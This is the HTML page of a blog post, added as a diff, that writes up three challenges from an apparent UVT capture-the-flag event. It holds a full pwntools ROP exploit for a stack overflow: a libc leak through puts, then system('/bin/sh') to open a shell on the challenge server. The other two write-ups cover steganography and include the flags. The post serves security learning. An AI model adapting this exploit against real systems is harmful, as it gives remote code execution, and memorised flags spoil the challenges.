@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>UVT | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="ctf">
+<meta name="description" content="Miller&rsquo;s Planet
+Pretty fun challenge, even if I spent way too much time debugging myself with it. It&rsquo;s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I&rsquo;m going to be calling vuln.
+
+Seems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in v1. (Thankfully no heap was necessary for this challenge). We don&rsquo;t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/uvt/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/uvt/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/uvt/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="UVT">
+  <meta property="og:description" content="Miller’s Planet Pretty fun challenge, even if I spent way too much time debugging myself with it. It’s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I’m going to be calling vuln.
+Seems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in v1. (Thankfully no heap was necessary for this challenge). We don’t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="UVT">
+<meta name="twitter:description" content="Miller&rsquo;s Planet
+Pretty fun challenge, even if I spent way too much time debugging myself with it. It&rsquo;s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I&rsquo;m going to be calling vuln.
+
+Seems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in v1. (Thankfully no heap was necessary for this challenge). We don&rsquo;t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "UVT",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/uvt/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "UVT",
+  "name": "UVT",
+  "description": "Miller\u0026rsquo;s Planet Pretty fun challenge, even if I spent way too much time debugging myself with it. It\u0026rsquo;s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I\u0026rsquo;m going to be calling vuln.\nSeems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in v1. (Thankfully no heap was necessary for this challenge). We don\u0026rsquo;t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.\n",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "Miller’s Planet Pretty fun challenge, even if I spent way too much time debugging myself with it. It’s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I’m going to be calling vuln.\nSeems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in v1. (Thankfully no heap was necessary for this challenge). We don’t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.\nThere even is a function calling system('echo something') which gives us a couple of system gadgets and also includes system’s plt in our binary.\nBut there’s a catch of course, we have extremely limited gadgets for the ROP chain. In total 136 unique and I went over all of them multiple times. Almost no rdi gadgets at all, except for a couple mov rdi, rax; call system/puts/printf.\n(Here, 0x50b0 is puts’ plt and 0x50c0 is system’s plt.)\nThe most interesting gadget we have at our disposal is the previously mentioned mov rdi, rax; call one. When the vuln calls gets, its return value is given in rax. And since gets’ return value is a pointer to the buffer we write into, that’s what rax would become: the stack location of v2 (so a stack pointer to its value).\nMy original idea was forming a payload starting with \"/bin/sh\\x00\\x00\", causing rax to become a /bin/sh pointer, exactly what system needs as its parameter - then using the mov rdi, rax; call system gadget. Debugging with gef, things were looking great:\nBut this would spawn a shell which would instantly detach from the process. I assumed it had something to do with alignment so I fiddled with some other gadget chains, but that didn’t change much.\nI did however manage to make it work locally by sending a payload that looked like b\"/bin/sh\\x00\"*35 + p64(gadget), but sadly that didn’t work remotely, even with different padding.\nHowever, we do have another /bin/sh available, the one in libc. So we need a leak. Calling puts(stack_offset) would be pretty nice here, and luckily we have just the gadget for that: rdi \u003c- rax \u003c- stack address; call puts(rdi);!\nAfter the leak is successfully printed, we just extract a random libc value from the dump and we can finally use one of libc.so.6’s pop rdi; ret gadgets. We already have the system plt so no need to calculate that ourselves. Here is the full script and the flag:\nfrom pwn import * elf = ELF('./miller') if args.REMOTE: p = remote('194.102.62.175', 22637) else: p = elf.process() gets_got = 0x405020 system_plt = 0x4010c0 bss = 0x405050 vuln = 0x4013a0 ret = 0x40101a lea_gadget = 0x401450 mov_rdi_rax_system = 0x401249 leave_ret = 0x401238 mov_rdi_rax_puts = 0x401395 payload1 = b\"A\" * 0x110 payload1 += b\"A\"*8 # rbp payload1 += p64(ret) payload1 += p64(mov_rdi_rax_puts) # leaked libc!! payload1 += p64(ret) payload1 += p64(vuln) p.recvuntil(b\"message\\n\") p.sendline(b\"100\") p.recvuntil(b\"message\\n\") p.sendline(payload1) leak_data = p.recvuntil(b\"message\\n\") print(\"raw leak:\", leak_data.hex()) # acum extragem de aici un leak random si ii scadem offsetul io_file_jumps_leak = u64(leak_data[208:216]) print(f\"iofilejumps is {hex(io_file_jumps_leak)}\") libc = io_file_jumps_leak - 0x217600 binsh = libc + 0x1d8678 libc_pop_rdi_ret = 0x02a3e5 + libc # acum putem folosi libc gadgets finally payload2 = b\"A\" * 0x110 payload2 += b\"A\"*8 # rbp payload2 += p64(libc_pop_rdi_ret) payload2 += p64(binsh) payload2 += p64(ret) payload2 += p64(system_plt) p.sendline(b\"100\") p.recvuntil(b\"message\\n\") p.sendline(payload2) p.interactive() Stellar Here just running sox frequencies.wav -n spectrogram was enough, and we can extract the flag UVT{5t4rsh1p_3ch03s_fr0m_th3_0ut3r_v01d}.\nWhere is everything? In this challenge, we’re provided with 3 files.\nFirst, empty.js - the binary we get from replacing all the \\u200b with 0s and the \\u200c with 1s from VOIDPAYLOAD can be decoded into a password protected zip.\nThe empty.txt file however was populated only by spaces, tabs and newlines. First I thought about whitespace, but that didn’t work, and I noticed that each line has exactly 8 characters. That made me think about binary again, so I replaced all the spaces with 0 and all the tabs with 1 and binary decoded that with the line feed delimiter.\nThat gives us this message:\nWe found a white frame labeled EMPTY. The real clue is in the faintest part of the signal, not the color you see, but the last breath of it. We only saw it when sampling the blue starlight... and not at every point. A pattern. A cadence. Like taking every third heartbeat along the grid. Once you recover the whisper from the image, it opens what the void is hiding. Since blue starlight is mentioned, I used Aperi’Solve for the image and looked at decompose for blue. But looking at the Common password(s) section in Aperi’Solve I saw D4rKm47T3rrr and thought I’d try that first with the zip, and it worked! We got a picture, and running strings on it gives us the flag, UVT{N0th1nG_iS_3mp7y_1n_sP4c3}.\n",
+  "wordCount" : "823",
+  "inLanguage": "en",
+  "datePublished": "2026-02-28T00:00:00Z",
+  "dateModified": "2026-02-28T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/uvt/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      UVT
+    </h1>
+    <div class="post-meta"><span title='2026-02-28 00:00:00 +0000 UTC'>February 28, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#millers-planet" aria-label="Miller&rsquo;s Planet">Miller&rsquo;s Planet</a></li>
+                <li>
+                    <a href="#stellar" aria-label="Stellar">Stellar</a></li>
+                <li>
+                    <a href="#where-is-everything" aria-label="Where is everything?">Where is everything?</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="millers-planet">Miller&rsquo;s Planet<a hidden class="anchor" aria-hidden="true" href="#millers-planet">#</a></h2>
+<p>Pretty fun challenge, even if I spent way too much time debugging myself with it. It&rsquo;s a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I&rsquo;m going to be calling vuln.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/vuln.png#center"></p>
+<p>Seems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in <code>v1</code>. (Thankfully no heap was necessary for this challenge). We don&rsquo;t even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT.</p>
+<p>There even is a function calling <code>system('echo something')</code> which gives us a couple of system gadgets and also includes system&rsquo;s plt in our binary.</p>
+<p>But there&rsquo;s a catch of course, we have extremely limited gadgets for the ROP chain. In total 136 unique and I went over <em>all of them</em> multiple times. Almost no <code>rdi</code> gadgets at all, except for a couple <code>mov rdi, rax; call system/puts/printf</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/gadgt.png#center"></p>
+<p><em>(Here, <code>0x50b0</code> is puts&rsquo; plt and <code>0x50c0</code> is system&rsquo;s plt.)</em></p>
+<p>The most interesting gadget we have at our disposal is the previously mentioned <code>mov rdi, rax; call</code> one. When the vuln calls gets, its return value is given in <code>rax</code>. And since gets&rsquo; return value is a pointer to the buffer we write into, that&rsquo;s what <code>rax</code> would become: the stack location of <code>v2</code> (so a stack pointer to its value).</p>
+<p>My original idea was forming a payload starting with <code>&quot;/bin/sh\x00\x00&quot;</code>, causing <code>rax</code> to become a /bin/sh pointer, exactly what system needs as its parameter - then using the <code>mov rdi, rax; call system</code> gadget. Debugging with gef, things were looking great:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/happen.png#center"></p>
+<p>But this would spawn a shell which would instantly detach from the process. I assumed it had something to do with alignment so I fiddled with some other gadget chains, but that didn&rsquo;t change much.</p>
+<p>I did however manage to make it work <em>locally</em> by sending a payload that looked like <code>b&quot;/bin/sh\x00&quot;*35 + p64(gadget)</code>, but sadly that didn&rsquo;t work remotely, even with different padding.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/wtf.png#center"></p>
+<p>However, we <em>do</em> have another /bin/sh available, the one in libc. So we need a leak. Calling <code>puts(stack_offset)</code> would be pretty nice here, and luckily we have just the gadget for that: <code>rdi &lt;- rax &lt;- stack address; call puts(rdi);</code>!</p>
+<p>After the leak is successfully printed, we just extract a random libc value from the dump and we can <em>finally</em> use one of <code>libc.so.6</code>&rsquo;s <code>pop rdi; ret</code> gadgets. We already have the system plt so no need to calculate that ourselves. Here is the full script and the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./miller&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;194.102.62.175&#39;</span>, <span style="color:#ae81ff">22637</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gets_got   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x405020</span>
+</span></span><span style="display:flex;"><span>system_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010c0</span>
+</span></span><span style="display:flex;"><span>bss        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x405050</span>
+</span></span><span style="display:flex;"><span>vuln       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013a0</span>
+</span></span><span style="display:flex;"><span>ret        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+</span></span><span style="display:flex;"><span>lea_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401450</span>
+</span></span><span style="display:flex;"><span>mov_rdi_rax_system <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401249</span>
+</span></span><span style="display:flex;"><span>leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401238</span>
+</span></span><span style="display:flex;"><span>mov_rdi_rax_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401395</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x110</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>   <span style="color:#75715e"># rbp </span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p64(mov_rdi_rax_puts)    <span style="color:#75715e"># leaked libc!!</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p64(vuln)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;100&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;raw leak:&#34;</span>, leak_data<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># acum extragem de aici un leak random si ii scadem offsetul</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>io_file_jumps_leak <span style="color:#f92672">=</span> u64(leak_data[<span style="color:#ae81ff">208</span>:<span style="color:#ae81ff">216</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;iofilejumps is </span><span style="color:#e6db74">{</span>hex(io_file_jumps_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> io_file_jumps_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x217600</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d8678</span>
+</span></span><span style="display:flex;"><span>libc_pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x02a3e5</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># acum putem folosi libc gadgets finally</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x110</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>   <span style="color:#75715e"># rbp</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(libc_pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(binsh) 
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(system_plt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;100&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/flag.png#center"></p>
+<h2 id="stellar">Stellar<a hidden class="anchor" aria-hidden="true" href="#stellar">#</a></h2>
+<p>Here just running <code>sox frequencies.wav -n spectrogram</code> was enough, and we can extract the flag UVT{5t4rsh1p_3ch03s_fr0m_th3_0ut3r_v01d}.</p>
+<h2 id="where-is-everything">Where is everything?<a hidden class="anchor" aria-hidden="true" href="#where-is-everything">#</a></h2>
+<p>In this challenge, we&rsquo;re provided with 3 files.</p>
+<p>First, empty.js - the binary we get from replacing all the <code>\u200b</code> with <code>0</code>s and the <code>\u200c</code> with <code>1</code>s from VOIDPAYLOAD can be decoded into a password protected zip.</p>
+<p>The empty.txt file however was populated only by spaces, tabs and newlines. First I thought about <a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language)">whitespace</a>, but that didn&rsquo;t work, and I noticed that each line has exactly 8 characters. That made me think about binary again, so I replaced all the spaces with <code>0</code> and all the tabs with <code>1</code> and binary decoded that with the line feed delimiter.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/uvt/bogd.png#center"></p>
+<p>That gives us this message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>We found a white frame labeled EMPTY.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The real clue is in the faintest part of the signal, not the color you see,
+</span></span><span style="display:flex;"><span>but the last breath of it.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We only saw it when sampling the blue starlight... and not at every point.
+</span></span><span style="display:flex;"><span>A pattern. A cadence. Like taking every third heartbeat along the grid.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Once you recover the whisper from the image, it opens what the void is hiding.
+</span></span></code></pre></div><p>Since <em>blue</em> starlight is mentioned, I used <a href="https://www.aperisolve.com/">Aperi&rsquo;Solve</a> for the image and looked at decompose for blue. But looking at the <em>Common password(s)</em> section in Aperi&rsquo;Solve I saw <code>D4rKm47T3rrr</code> and thought I&rsquo;d try that first with the zip, and it worked! We got a picture, and running <code>strings</code> on it gives us the flag, <code>UVT{N0th1nG_iS_3mp7y_1n_sP4c3}</code>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
